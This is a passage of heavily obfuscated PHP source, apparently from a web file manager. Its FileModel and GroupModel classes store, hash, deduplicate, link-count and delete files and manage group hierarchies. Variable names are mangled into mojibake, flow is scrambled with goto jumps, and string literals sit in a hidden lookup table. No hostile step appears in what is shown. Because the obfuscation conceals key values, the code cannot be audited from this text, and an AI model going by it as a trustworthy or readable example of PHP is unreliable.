($aŒàê×®ÖĞ as &$c´ëˆˆªÉÆ) { $c´ëˆˆªÉÆ[$eÔæ„Ëµ–ö[442]] = $DÃğÁ»«°‘[$c´ëˆˆªÉÆ[$eÔæ„Ëµ–ö[1688]]]; if (isset($c´ëˆˆªÉÆ[$eÔæ„Ëµ–ö[1691]])) { $c´ëˆˆªÉÆ[$eÔæ„Ëµ–ö[1691]][$eÔæ„Ëµ–ö[442]] = $DÃğÁ»«°‘[$c´ëˆˆªÉÆ[$eÔæ„Ëµ–ö[1691]][$eÔæ„Ëµ–ö[1688]]]; } } unset($c´ëˆˆªÉÆ); goto BÃ†Ô£ó; BÃ†Ô£ó: } private function metaList($b¡‹¸‘ƒÆÇ) { goto Déí‡º§Ë”; C™¤éãÎŸ: return $BØŞÚÈ±‹ ? $BØŞÚÈ±‹ : array(); goto b¢Ğö¯Ñ³Â; F›ÇÁó¯›: $BØŞÚÈ±‹ = Model($AÒŒ ‰â†[1692])->where($DàÒµäÀçá)->select(); $BØŞÚÈ±‹ = array_to_keyvalue_group($BØŞÚÈ±‹, $AÒŒ ‰â†[1688]); foreach ($BØŞÚÈ±‹ as $eÔ„ÉÌÃŞ† => $BóÂ±†±åÊ) { $CáÆ”í·ƒë = array(); foreach ($BóÂ±†±åÊ as $f¤Ç¹ööéù) { $CáÆ”í·ƒë[$f¤Ç¹ööéù[$AÒŒ ‰â†[99]]] = $f¤Ç¹ööéù[$AÒŒ ‰â†[375]]; } $BØŞÚÈ±‹[$eÔ„ÉÌÃŞ†] = $CáÆ”í·ƒë; } goto C™¤éãÎŸ; Déí‡º§Ë”: $AÒŒ ‰â† =& $_SERVER[¢Í]; if (!$b¡‹¸‘ƒÆÇ) { return array(); } $DàÒµäÀçá = array($AÒŒ ‰â†[1688] => array($AÒŒ ‰â†[7], $b¡‹¸‘ƒÆÇ)); goto F›ÇÁó¯›; b¢Ğö¯Ñ³Â: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\x65"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\155\x65" => "\x69\x6f\137\146\x69\x6c\145\137\x6d\x65\x74\x61", "\x6d\x65\x74\141\x46\x69\x65\154\144" => "\146\x69\x6c\x65\x49\104"); public function fileInfo($Dœºéš‘¼™) { $DÉÏÃé¦ˆ =& $_SERVER[¢Í]; static $aá¹ê ÈƒÉ = array(); if (!isset($aá¹ê ÈƒÉ[$Dœºéš‘¼™])) { $f…—”„§Á = $DÉÏÃé¦ˆ[1693]; $FÍ³Ğ¡­Šø = Model($DÉÏÃé¦ˆ[447])->field($f…—”„§Á)->where(array($DÉÏÃé¦ˆ[445] => $Dœºéš‘¼™))->find(); $aá¹ê ÈƒÉ[$Dœºéš‘¼™] = $FÍ³Ğ¡­Šø; } return $aá¹ê ÈƒÉ[$Dœºéš‘¼™]; } public function addFileByContent($d†ùºÇœ ¼ = '', $Aå¥ø«„î = '') { goto fË¶³‚äóÓ; f†Æ²ÊØß±: if (file_exists($eóš‚Â–Š)) { @unlink($eóš‚Â–Š); } return $E‹·î®ß›æ; goto BÃÏ¼½èâ§; E¿–®½ĞÒƒ: $eóš‚Â–Š = $Eğ¯¦Ù§ö« . $dà÷­²íŠº[1695] . rand_string(16); file_put_contents($eóš‚Â–Š, $d†ùºÇœ ¼); $E‹·î®ß›æ = $this->addFile($eóš‚Â–Š, $Aå¥ø«„î, !0); goto f†Æ²ÊØß±; fË¶³‚äóÓ: $dà÷­²íŠº =& $_SERVER[¢Í]; $Eğ¯¦Ù§ö« = TEMP_PATH . $dà÷­²íŠº[1694]; if (!is_dir($Eğ¯¦Ù§ö«)) { mk_dir($Eğ¯¦Ù§ö«); } goto E¿–®½ĞÒƒ; BÃÏ¼½èâ§: } public function createFileName($Dƒ©ìÍ¨É«) { goto eÑœ‹ùÒ×ö; eÑœ‹ùÒ×ö: $f°˜ÃÀØ =& $_SERVER[¢Í]; $bØßÜÅíâ… = IO::init($f°˜ÃÀØ[8]); $f˜²Ñƒøã = $this->makeFilePath($Dƒ©ìÍ¨É«, $bØßÜÅíâ…); goto c„¢ß…‹Ì; dã§éÙÄÉ: if (!$a‘‚¼İ¤ && !Cache::get($D®ùáĞƒÁÜ)) { $a‘‚¼İ¤ = !0; $a¢©ÃÈ¶´­ = IO::mkdir($B™É±¹¶Ä); if (!IO::exist($a¢©ÃÈ¶´­ . $f°˜ÃÀØ[1697])) { IO::mkfile($a¢©ÃÈ¶´­ . $f°˜ÃÀØ[1697]); } Cache::set($D®ùáĞƒÁÜ, 1, 3600 * 2); } return $f˜²Ñƒøã; goto E¨‚“âğåÀ; c„¢ß…‹Ì: $B™É±¹¶Ä = $bØßÜÅíâ…->pathFather($f˜²Ñƒøã); static $a‘‚¼İ¤ = false; $D®ùáĞƒÁÜ = $f°˜ÃÀØ[1696] . md5($B™É±¹¶Ä); goto dã§éÙÄÉ; E¨‚“âğåÀ: } public function makeFilePath($E‚‰çäàÜ, $b¤Ñ¹ñ‰ßµ) { goto Cñ¢»İ¼ô«; A†ô­á”íÑ: switch ($CİÛ›ä·á‘) { case $Fî¹‘êŒĞ„[1701]: $e×ÆÒ¦³œÂ = $e×ÆÒ¦³œÂ . $Fî¹‘êŒĞ„[101] . $b¤Ñ¹ñ‰ßµ->ext($E‚‰çäàÜ); if ($b¤Ñ¹ñ‰ßµ->ext($E‚‰çäàÜ) == $Fî¹‘êŒĞ„[1638]) { $e×ÆÒ¦³œÂ .= $Fî¹‘êŒĞ„[1390]; } break; case $Fî¹‘êŒĞ„[1702]: goto EËˆĞõÏÚ¿; EËˆĞõÏÚ¿: $Céèå‹“ƒñ = Model($Fî¹‘êŒĞ„[1090])->get($Fî¹‘êŒĞ„[1386]); $d¡š˜Ëëà = substr(md5($Fî¹‘êŒĞ„[1703] . $Céèå‹“ƒñ . date($Fî¹‘êŒĞ„[701])), 0, 8); $F‰ç¶¤ï²³ = KodIO::defaultDriver(); goto B·²±İ¹ì; A©ôâ¾Òò‹: CacheLock::lock($dáëœ¤ÙÀË); $b®æ¹òêŒŒ = IO::fileNameAuto($EÑİÈ‡ï¥¯, $E‚‰çäàÜ); $e×ÆÒ¦³œÂ = $EÑİÈ‡ï¥¯ . $b®æ¹òêŒŒ; goto fî„­Îëƒ×; B·²±İ¹ì: $EÑİÈ‡ï¥¯ = $Fî¹‘êŒĞ„[1088] . $F‰ç¶¤ï²³[$Fî¹‘êŒĞ„[392]] . $Fî¹‘êŒĞ„[1704] . date($Fî¹‘êŒĞ„[1705]) . $d¡š˜Ëëà . $Fî¹‘êŒĞ„[8]; if ($b¤Ñ¹ñ‰ßµ->ext($E‚‰çäàÜ) == $Fî¹‘êŒĞ„[1638]) { $E‚‰çäàÜ .= $Fî¹‘êŒĞ„[1390]; } $dáëœ¤ÙÀË = $Fî¹‘êŒĞ„[1706] . $EÑİÈ‡ï¥¯ . $E‚‰çäàÜ; goto A©ôâ¾Òò‹; fî„­Îëƒ×: if (IO::isTypeObject($e×ÆÒ¦³œÂ) && !IO::isUploadServer($e×ÆÒ¦³œÂ)) { $B¿™Ÿê†Â = IO::setContent($e×ÆÒ¦³œÂ, $Fî¹‘êŒĞ„[33]); if (!$B¿™Ÿê†Â) { show_json($Fî¹‘êŒĞ„[1707], !1); } } CacheLock::unlock($dáëœ¤ÙÀË); break; goto e³‹êÔ­É‰; e³‹êÔ­É‰: case $Fî¹‘êŒĞ„[1700]: break; default: break; } return $e×ÆÒ¦³œÂ; goto Bµ’˜ƒÅ¨Ü; BÃÚÈÆÊÊº: $e×ÆÒ¦³œÂ = $EÑİÈ‡ï¥¯ . rand_string(5) . short_id(100); $E‚‰çäàÜ = str_replace($Fî¹‘êŒĞ„[8], $Fî¹‘êŒĞ„[80], KodIO::clear($E‚‰çäàÜ)); if (!$E‚‰çäàÜ) { $CİÛ›ä·á‘ = $Fî¹‘êŒĞ„[1700]; } goto A†ô­á”íÑ; Cñ¢»İ¼ô«: $Fî¹‘êŒĞ„ =& $_SERVER[¢Í]; $CİÛ›ä·á‘ = Model($Fî¹‘êŒĞ„[1090])->get($Fî¹‘êŒĞ„[1698]); $EÑİÈ‡ï¥¯ = KodIO::defaultIO() . date($Fî¹‘êŒĞ„[1699]); goto BÃÚÈÆÊÊº; Bµ’˜ƒÅ¨Ü: } public function addFileByRemote($f‡›¤î¤Œ, $B‰±Ï‡ÆË£, $e·–‹£è©è = array()) { goto cº×±ß¦ãÓ; d¢·ÜğìÌ: $FïÁ¿â®ä = IO::hashMd5($f‡›¤î¤Œ, $f‚Û¼¥£Ï¤); $cäóß”õèÍ = KodIO::defaultDriver(); $cÛİ«ï“‡ = array($f“ğ²±‚ªš[546] => IO::size($f‡›¤î¤Œ), $f“ğ²±‚ªš[1708] => 1, $f“ğ²±‚ªš[411] => $B‰±Ï‡ÆË£, $f“ğ²±‚ªš[749] => $cäóß”õèÍ[$f“ğ²±‚ªš[392]], $f“ğ²±‚ªš[412] => $f‡›¤î¤Œ, $f“ğ²±‚ªš[1709] => $e·–‹£è©è[$f“ğ²±‚ªš[178]] ? $e·–‹£è©è[$f“ğ²±‚ªš[178]] : IO::hashSimple($f‡›¤î¤Œ), $f“ğ²±‚ªš[1710] => $FïÁ¿â®ä ? $FïÁ¿â®ä : $f‚Û¼¥£Ï¤); goto Dæ‚øêŒ¦; cº×±ß¦ãÓ: $f“ğ²±‚ªš =& $_SERVER[¢Í]; if (!IO::exist($f‡›¤î¤Œ)) { return !1; } $f‚Û¼¥£Ï¤ = $e·–‹£è©è[$f“ğ²±‚ªš[177]] ? $e·–‹£è©è[$f“ğ²±‚ªš[177]] : $f“ğ²±‚ªš[33]; goto d¢·ÜğìÌ; Dæ‚øêŒ¦: if ($aë¸œ¿Êäç = $this->addFileCheckExist($cÛİ«ï“‡[$f“ğ²±‚ªš[178]], $cÛİ«ï“‡[$f“ğ²±‚ªš[177]], $cÛİ«ï“‡[$f“ğ²±‚ªš[87]])) { return $aë¸œ¿Êäç; } return $this->addFileData($cÛİ«ï“‡); goto e¡­Š±é¤§; e¡­Š±é¤§: } private function addFileData($F‡”§¤Š°) { $f“•Ó¢¨°á =& $_SERVER[¢Í]; if (!$F‡”§¤Š°) { return !1; } $F‡”§¤Š°[$f“•Ó¢¨°á[87]] = intval($F‡”§¤Š°[$f“•Ó¢¨°á[87]]); if (!$F‡”§¤Š°[$f“•Ó¢¨°á[87]] && strlen($F‡”§¤Š°[$f“•Ó¢¨°á[178]]) > 32) { $F‡”§¤Š°[$f“•Ó¢¨°á[87]] = intval(substr($F‡”§¤Š°[$f“•Ó¢¨°á[178]], 32)); } $fÒ¸¶“„š = $this->add($F‡”§¤Š°); return $this->find($fÒ¸¶“„š); } public function addFile($bêîÅ‡£Æ, $DŠ»îÔå–, $dîƒ¥ĞÎ«µ = false) { goto BÉ£œó®êŸ; bÊªõ°›¼: $c‰Ä»™·õ = $this->addFileMake($bêîÅ‡£Æ, $FŒ¥ÌóœÊš, $Eƒ¦¿Ê÷•Ú, $Bæ³‘§†Ò, $DŠ»îÔå–, $dîƒ¥ĞÎ«µ); $cŞõÓõªñæ = $this->addFileData($c‰Ä»™·õ); CacheLock::unlock($b·•Å®èôÌ); goto e»³¶í•; cÊÔ‚ØàŞ…: $b·•Å®èôÌ = $_SERVER[¢Í][1711] . $Bæ³‘§†Ò; CacheLock::lock($b·•Å®èôÌ); if ($dÌŠòÂï—Ç = $this->addFileCheckExist($Eƒ¦¿Ê÷•Ú, $Bæ³‘§†Ò, $FŒ¥ÌóœÊš)) { CacheLock::unlock($b·•Å®èôÌ); return $dÌŠòÂï—Ç; } goto bÊªõ°›¼; e»³¶í•: return $cŞõÓõªñæ; goto f×¾œ‹ƒ¶; BÉ£œó®êŸ: $Eƒ¦¿Ê÷•Ú = IO::hashSimple($bêîÅ‡£Æ); $Bæ³‘§†Ò = IO::hashMd5($bêîÅ‡£Æ); $FŒ¥ÌóœÊš = IO::size($bêîÅ‡£Æ); goto cÊÔ‚ØàŞ…; f×¾œ‹ƒ¶: } public function addFileMake($EÖÃÙ‡ò¥, $b–ƒÙ§­Ó‹, $BÉ¡°Ğ·Î©, $FØ®Á¢×«‚, $CÑ“†¾¹Ÿ, $DË—·°ìË) { goto b˜Â¨ßë; FÃ» ±„‡«: $D¹êİÆïß = KodIO::defaultDriver(); $e¥ğÑÔ±¾× = array($d½«Œ˜ß…ƒ[546] => $b–ƒÙ§­Ó‹, $d½«Œ˜ß…ƒ[1708] => 1, $d½«Œ˜ß…ƒ[411] => $CÑ“†¾¹Ÿ, $d½«Œ˜ß…ƒ[749] => $D¹êİÆïß[$d½«Œ˜ß…ƒ[392]], $d½«Œ˜ß…ƒ[412] => $A„­Éõµ¢ƒ, $d½«Œ˜ß…ƒ[1709] => $BÉ¡°Ğ·Î©, $d½«Œ˜ß…ƒ[1710] => $FØ®Á¢×«‚); return $e¥ğÑÔ±¾×; goto A·‚ç¦©’ğ; e†–»ôÎ¾å: $bµƒÓ”– = get_path_this($A„­Éõµ¢ƒ); if ($DË—·°ìË) { $DŠ©Œ¯”ì = IO::move($EÖÃÙ‡ò¥, $aŠ’ëÂŸÇÚ, !1, $bµƒÓ”–); } else { $DŠ©Œ¯”ì = IO::copy($EÖÃÙ‡ò¥, $aŠ’ëÂŸÇÚ, !1, $bµƒÓ”–); } if (!$DŠ©Œ¯”ì) { return !1; } goto FÃ» ±„‡«; b˜Â¨ßë: $d½«Œ˜ß…ƒ =& $_SERVER[¢Í]; $A„­Éõµ¢ƒ = $this->createFileName($CÑ“†¾¹Ÿ); $aŠ’ëÂŸÇÚ = get_path_father($A„­Éõµ¢ƒ); goto e†–»ôÎ¾å; A·‚ç¦©’ğ: } public function addFileCheckExist($E½¶İéÈğ´, $dùÊÔ¼ŸÓï, $B¹õÉ¹æì­) { $FÚÔ¥ŞïšÇ =& $_SERVER[¢Í]; $Eä†ôäâˆ‚ = $this->findByHash($E½¶İéÈğ´, $dùÊÔ¼ŸÓï); if (!$Eä†ôäâˆ‚) { return !1; } $C­Ñ–Èò‘ä = array($FÚÔ¥ŞïšÇ[1708] => intval($Eä†ôäâˆ‚[$FÚÔ¥ŞïšÇ[1712]]) + 1, $FÚÔ¥ŞïšÇ[546] => $B¹õÉ¹æì­); $this->where(array($FÚÔ¥ŞïšÇ[445] => $Eä†ôäâˆ‚[$FÚÔ¥ŞïšÇ[444]]))->save($C­Ñ–Èò‘ä); return $Eä†ôäâˆ‚; } public function remove($Fã‡³©×ÉÑ) { $this->linkCountChange($Fã‡³©×ÉÑ, !1); $this->clearEmpty(); return !0; } public function linkAdd($F”àÎœäÏ) { $this->linkCountChange($F”àÎœäÏ, !0); } public function linkCountChange($aàÂÛàò, $dã¢Ë«Ô¡¶) { goto Aœ‡°ê—”—; AŠó–™Ù§Î: foreach ($dİÖìË§ç as $AœŠ˜Ç°ãØ => $e‰¨º»‡é) { $eİ¢«ØĞ´» = $e‰¨º»‡é . $bŠ¯‘ÀäÙ[33]; if (!$fÚÓ÷õµ¸»[$eİ¢«ØĞ´»]) { $fÚÓ÷õµ¸»[$eİ¢«ØĞ´»] = array(); } $fÚÓ÷õµ¸»[$eİ¢«ØĞ´»][] = $AœŠ˜Ç°ãØ; } foreach ($fÚÓ÷õµ¸» as $e‰¨º»‡é => $eÂÆÔâ–ğó) { if (!$eÂÆÔâ–ğó) { continue; } $e‰¨º»‡é = $dã¢Ë«Ô¡¶ ? $e‰¨º»‡é : -intval($e‰¨º»‡é); $AÔ»¤¼Ì› = array($bŠ¯‘ÀäÙ[444] => array($bŠ¯‘ÀäÙ[7], $eÂÆÔâ–ğó)); if ($e‰¨º»‡é < 0) { $AÔ»¤¼Ì›[$bŠ¯‘ÀäÙ[1712]] = array($bŠ¯‘ÀäÙ[940], abs($e‰¨º»‡é)); } $this->where($AÔ»¤¼Ì›)->setAdd($bŠ¯‘ÀäÙ[1712], $e‰¨º»‡é); } goto A°ØğˆÕÇ©; b¹ì¿ØªÛ: $dİÖìË§ç = array(); foreach ($aàÂÛàò as $AœŠ˜Ç°ãØ) { $eİ¢«ØĞ´» = $AœŠ˜Ç°ãØ . $bŠ¯‘ÀäÙ[33]; if (!$dİÖìË§ç[$eİ¢«ØĞ´»]) { $dİÖìË§ç[$eİ¢«ØĞ´»] = 0; } $dİÖìË§ç[$eİ¢«ØĞ´»]++; } $fÚÓ÷õµ¸» = array(); goto AŠó–™Ù§Î; Aœ‡°ê—”—: $bŠ¯‘ÀäÙ =& $_SERVER[¢Í]; if (!$aàÂÛàò) { return; } if (!is_array($aàÂÛàò)) { $aàÂÛàò = array($aàÂÛàò); } goto b¹ì¿ØªÛ; A°ØğˆÕÇ©: } public function findByHash($e‡Ê…ö—ä, $A¿áƒƒÛÜà = false) { $C¯Àº”©®İ =& $_SERVER[¢Í]; if (!$e‡Ê…ö—ä && !$A¿áƒƒÛÜà) { return !1; } $CÄË¸ïÍ¿Ã = array($C¯Àº”©®İ[1709] => $e‡Ê…ö—ä); if ($A¿áƒƒÛÜà) { $CÄË¸ïÍ¿Ã = array($C¯Àº”©®İ[1710] => $A¿áƒƒÛÜà); } return $this->order($C¯Àº”©®İ[1713])->where($CÄË¸ïÍ¿Ã)->find(); } public function clearEmpty($CÏ–æ¾æø¨ = 0) { goto a¾ÓÃëèæ‡; e“¦´–Û°: $d‹ÑÓ°„’Ö = $this->where($f ´“õˆéó)->select(); if (!$d‹ÑÓ°„’Ö) { return; } $B¨–øšÏì = new Task($a¹¶¤ˆ¯¥[1715], $a¹¶¤ˆ¯¥[33], count($d‹ÑÓ°„’Ö)); goto bÂÕ·íÔÒî; a¾ÓÃëèæ‡: $a¹¶¤ˆ¯¥ =& $_SERVER[¢Í]; $fÊ¨‡Î÷ğ¶ = time() - 3600 * 24 * $CÏ–æ¾æø¨; $f ´“õˆéó = $a¹¶¤ˆ¯¥[1714] . $fÊ¨‡Î÷ğ¶; goto e“¦´–Û°; bÂÕ·íÔÒî: foreach ($d‹ÑÓ°„’Ö as $eŞ÷šê«¤£) { $B¨–øšÏì->update(1); $this->resetFile($eŞ÷šê«¤£); } $B¨–øšÏì->end(); goto bœ£‡·‡­î; bœ£‡·‡­î: } public function resetFile($d»´À³ÑÅ) { goto CÓ´Ü†ïğÒ; eÊ¿œåÜ¯ñ: $EÛäîñ¦˜¡ = Model($dêßÇõê†Õ[1716])->where($eªâ…‚×©)->count(); $fÙ¸ØéÏ± = intval($Fß˜ï¦«Ã) + intval($EÛäîñ¦˜¡); if ($fÙ¸ØéÏ± == 0) { IO::remove($d»´À³ÑÅ[$dêßÇõê†Õ[85]]); $this->where($eªâ…‚×©)->delete(); $this->metaSet($d»´À³ÑÅ[$dêßÇõê†Õ[444]], null, null); return; } goto eæƒ›Æ¹ù; CÓ´Ü†ïğÒ: $dêßÇõê†Õ =& $_SERVER[¢Í]; $eªâ…‚×© = array($dêßÇõê†Õ[445] => $d»´À³ÑÅ[$dêßÇõê†Õ[444]]); $Fß˜ï¦«Ã = Model($dêßÇõê†Õ[1169])->where($eªâ…‚×©)->count(); goto eÊ¿œåÜ¯ñ; eæƒ›Æ¹ù: if ($d»´À³ÑÅ[$dêßÇõê†Õ[1712]] != $fÙ¸ØéÏ±) { $this->where($eªâ…‚×©)->save(array($dêßÇõê†Õ[1708] => $fÙ¸ØéÏ±)); } goto b…ØÉó´¬Â; b…ØÉó´¬Â: } public function storageInfo($A˜‚¯ÖİÎô = false) { goto b…Á²ÑÆ Ÿ; b…Á²ÑÆ Ÿ: $Dçé‹Õ²šõ =& $_SERVER[¢Í]; $fºª£ç«½ = $this->count() + 0.0; $bÔêÚÕ¦Ù = 0; goto cŒìÏù´±õ; cŒìÏù´±õ: $còß¿ö©À = 1; $AĞ„Ï†Äêå = 0; $Cêš„”†­™ = 5000; goto f×©İÕÀ¤ò; f×©İÕÀ¤ò: for ($B¥±Ÿ†ùá’ = 0; $B¥±Ÿ†ùá’ < $fºª£ç«½; $B¥±Ÿ†ùá’ = $B¥±Ÿ†ùá’ + $Cêš„”†­™) { $bœŞî±àÛ = $this->limit($B¥±Ÿ†ùá’, $B¥±Ÿ†ùá’ + $Cêš„”†­™)->select(); foreach ($bœŞî±àÛ as $Añ†èÒº¡) { $còß¿ö©À += $Añ†èÒº¡[$Dçé‹Õ²šõ[87]] * $Añ†èÒº¡[$Dçé‹Õ²šõ[1712]]; $bÔêÚÕ¦Ù += $Añ†èÒº¡[$Dçé‹Õ²šõ[87]] * ($Añ†èÒº¡[$Dçé‹Õ²šõ[1712]] - 1); $AĞ„Ï†Äêå += $Añ†èÒº¡[$Dçé‹Õ²šõ[1712]]; } } $føíéÅ‰«¢ = array($Dçé‹Õ²šõ[1717] => $còß¿ö©À, $Dçé‹Õ²šõ[1718] => $bÔêÚÕ¦Ù, $Dçé‹Õ²šõ[1719] => $bÔêÚÕ¦Ù / $còß¿ö©À, $Dçé‹Õ²šõ[91] => $fºª£ç«½, $Dçé‹Õ²šõ[1720] => $AĞ„Ï†Äêå); return $føíéÅ‰«¢; goto aµŞöâ¦§İ; aµŞöâ¦§İ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\155\145" => "\x67\x72\x6f\x75\160\137\155\145\x74\141", "\x6d\x65\164\141\106\x69\x65\154\144" => "\x67\162\157\165\160\x49\x44"); protected function cacheFunctionAlias($AèõÕØÄªŠ) { $EáÔŞíìÑ =& $_SERVER[¢Í]; return array($EáÔŞíìÑ[1721] => array($AèõÕØÄªŠ[0], $EáÔŞíìÑ[1722]), $EáÔŞíìÑ[1723] => array($AèõÕØÄªŠ[0], $EáÔŞíìÑ[1722])); } protected function getInfo($dæŸÀ¼É’) { $A©•®Å­‡ì = $this->getInfoSimple($dæŸÀ¼É’); if (!$A©•®Å­‡ì) { return !1; } return $this->_listDataApplyItem($A©•®Å­‡ì); } protected function getInfoSimple($bô£—‡Úô—, $cÖ¦ä‘¼¦¨ = false) { $F¯¥àØñ“Á =& $_SERVER[¢Í]; if ($cÖ¦ä‘¼¦¨) { $fè¼’°‡ãĞ = array($F¯¥àØñ“Á[1648] => intval($bô£—‡Úô—)); $d´ö–¤·•¢ = $this->where($fè¼’°‡ãĞ)->find(); return is_array($d´ö–¤·•¢) ? $d´ö–¤·•¢ : array(); } return $this->cacheFunctionGet($F¯¥àØñ“Á[1724], $bô£—‡Úô—); } protected function groupAdd($Dä‹„´íâ®) { goto cß‘ª½‡¤; aÛ¶ß†Šò²: if (isset($Dä‹„´íâ®[$E—±ëô³²‹[1727]])) { $this->metaSet($Dçß„¶äÌ, array($E—±ëô³²‹[1727] => $Dä‹„´íâ®[$E—±ëô³²‹[1727]], $E—±ëô³²‹[1728] => $Dä‹„´íâ®[$E—±ëô³²‹[1728]])); unset($Dä‹„´íâ®[$E—±ëô³²‹[1727]]); unset($Dä‹„´íâ®[$E—±ëô³²‹[1728]]); } Model($E—±ëô³²‹[1169])->groupRootAdd($Dçß„¶äÌ); return $Dçß„¶äÌ; goto c¼Ğ…õš; cñœ¬ù“Éì: if (!empty($Dä‹„´íâ®[$E—±ëô³²‹[1648]])) { $F’¨ï¦Ã×Ü[$E—±ëô³²‹[1648]] = $Dä‹„´íâ®[$E—±ëô³²‹[1648]]; } $Dçß„¶äÌ = $this->add($F’¨ï¦Ã×Ü); $this->setNamePinyin($Dçß„¶äÌ, $F’¨ï¦Ã×Ü[$E—±ëô³²‹[28]]); goto aÛ¶ß†Šò²; cß‘ª½‡¤: $E—±ëô³²‹ =& $_SERVER[¢Í]; if (!$Dä‹„´íâ®[$E—±ëô³²‹[487]] && isset($Dä‹„´íâ®[$E—±ëô³²‹[1648]]) && $Dä‹„´íâ®[$E—±ëô³²‹[1648]] == 1) { if ($CÍÉÂ¢Ê…… = $this->getInfoSimple($Dä‹„´íâ®[$E—±ëô³²‹[1648]], !0)) { return $Dä‹„´íâ®[$E—±ëô³²‹[1648]]; } } else { $CÍÉÂ¢Ê…… = $this->getInfoSimple($Dä‹„´íâ®[$E—±ëô³²‹[487]]); if (!$CÍÉÂ¢Ê……) { return !1; } } $a‹œ­ÃÏ« = $E—±ëô³²‹[496]; goto aÙ³ŞÇÎ­; aÙ³ŞÇÎ­: if ($CÍÉÂ¢Ê……[$E—±ëô³²‹[485]]) { $a‹œ­ÃÏ« = $CÍÉÂ¢Ê……[$E—±ëô³²‹[485]] . $CÍÉÂ¢Ê……[$E—±ëô³²‹[1648]] . $E—±ëô³²‹[47]; } $F’¨ï¦Ã×Ü = array($E—±ëô³²‹[411] => $this->groupNameAuto($Dä‹„´íâ®[$E—±ëô³²‹[487]], $Dä‹„´íâ®[$E—±ëô³²‹[28]]), $E—±ëô³²‹[393] => $Dä‹„´íâ®[$E—±ëô³²‹[487]], $E—±ëô³²‹[551] => $a‹œ­ÃÏ«, $E—±ëô³²‹[1725] => $Dä‹„´íâ®[$E—±ëô³²‹[1632]], $E—±ëô³²‹[1726] => 0, $E—±ëô³²‹[1652] => 0); if (isset($Dä‹„´íâ®[$E—±ëô³²‹[1671]])) { $F’¨ï¦Ã×Ü[$E—±ëô³²‹[1671]] = $Dä‹„´íâ®[$E—±ëô³²‹[1671]]; } else { $E¿ŒÒá¾ñ° = $this->max($E—±ëô³²‹[1671]); if (!$E¿ŒÒá¾ñ°) { $E¿ŒÒá¾ñ° = 0; } $F’¨ï¦Ã×Ü[$E—±ëô³²‹[1671]] = $E¿ŒÒá¾ñ° + 1; } goto cñœ¬ù“Éì; c¼Ğ…õš: } protected function groupEdit($e¯¶äÌêÁ†, $Eˆçë—ñ¯¾) { $eâ±†ÔÀø‹ =& $_SERVER[¢Í]; if (!empty($Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[487]])) { $b Ò¤šÈŸ = $this->getInfoSimple($e¯¶äÌêÁ†); $d‰¸ƒÔí˜Œ = $this->getInfoSimple($Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[487]]); if (!$b Ò¤šÈŸ || !$d‰¸ƒÔí˜Œ) { return !1; } if ($b Ò¤šÈŸ[$eâ±†ÔÀø‹[1648]] == $d‰¸ƒÔí˜Œ[$eâ±†ÔÀø‹[1648]]) { return !1; } if ($Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[487]] != $b Ò¤šÈŸ[$eâ±†ÔÀø‹[487]]) { if ($d‰¸ƒÔí˜Œ[$eâ±†ÔÀø‹[485]] !== $b Ò¤šÈŸ[$eâ±†ÔÀø‹[485]] && strpos($d‰¸ƒÔí˜Œ[$eâ±†ÔÀø‹[485]], $b Ò¤šÈŸ[$eâ±†ÔÀø‹[485]] . $b Ò¤šÈŸ[$eâ±†ÔÀø‹[1648]] . $eâ±†ÔÀø‹[47]) === 0) { return !1; } $Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[551]] = $d‰¸ƒÔí˜Œ[$eâ±†ÔÀø‹[485]] . $Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[487]] . $eâ±†ÔÀø‹[47]; $this->_changeChildLevel($b Ò¤šÈŸ, $d‰¸ƒÔí˜Œ); } } if (isset($Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[28]])) { $this->setNamePinyin($e¯¶äÌêÁ†, $Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[28]]); } if (isset($Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[1727]])) { $this->metaSet($e¯¶äÌêÁ†, array($eâ±†ÔÀø‹[1727] => $Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[1727]], $eâ±†ÔÀø‹[1728] => $Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[1728]])); unset($Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[1727]]); unset($Eˆçë—ñ¯¾[$eâ±†ÔÀø‹[1728]]); } return $this->where(array($eâ±†ÔÀø‹[1729] => $e¯¶äÌêÁ†))->save($Eˆçë—ñ¯¾); } private function _changeChildLevel($CºõÓ›ßãã, $d™¹çîàŸ–, $aÂ´øï‰ß = false) { goto c±™Ş£Ôì¨; AÚ¥Ä»Í¬: if ($aÂ´øï‰ß) { $F¿©‘´İë¸ = $d™¹çîàŸ–[$d…êç‡Î—[485]] . $d™¹çîàŸ–[$d…êç‡Î—[1648]] . $d…êç‡Î—[47]; } $A¿´êÔ…Ü… = array($d…êç‡Î—[551] => array($d…êç‡Î—[509], $CºõÓ›ßãã[$d…êç‡Î—[485]] . $CºõÓ›ßãã[$d…êç‡Î—[1648]] . $d…êç‡Î—[510])); $eÖ¨Ìñ‚ğ = array($d…êç‡Î—[551] => array($d…êç‡Î—[559], "\162\145\160\x6c\141\143\145\x28\x70\x61\x72\145\156\x74\114\x65\x76\145\x6c\x2c\x27{$C°©£‘Œ½ï}\47\x2c\47{$F¿©‘´İë¸}\x27\51")); goto A »ÍÓ¼ ±; A »ÍÓ¼ ±: $this->where($A¿´êÔ…Ü…)->data($eÖ¨Ìñ‚ğ)->save(); goto Dİ ÂùÔ‚Æ; c±™Ş£Ôì¨: $d…êç‡Î— =& $_SERVER[¢Í]; $C°©£‘Œ½ï = $CºõÓ›ßãã[$d…êç‡Î—[485]] . $CºõÓ›ßãã[$d…êç‡Î—[1648]] . $d…êç‡Î—[47]; $F¿©‘´İë¸ = $d™¹çîàŸ–[$d…êç‡Î—[485]] . $d™¹çîàŸ–[$d…êç‡Î—[1648]] . $d…êç‡Î—[47] . $CºõÓ›ßãã[$d…êç‡Î—[1648]] . $d…êç‡Î—[47]; goto AÚ¥Ä»Í¬; Dİ ÂùÔ‚Æ: } public function setNamePinyin($a¹ˆÁòÜ, $F‘¤…çÄ = false) { $BÄİ‹›ª’ =& $_SERVER[¢Í]; if (!$F‘¤…çÄ) { 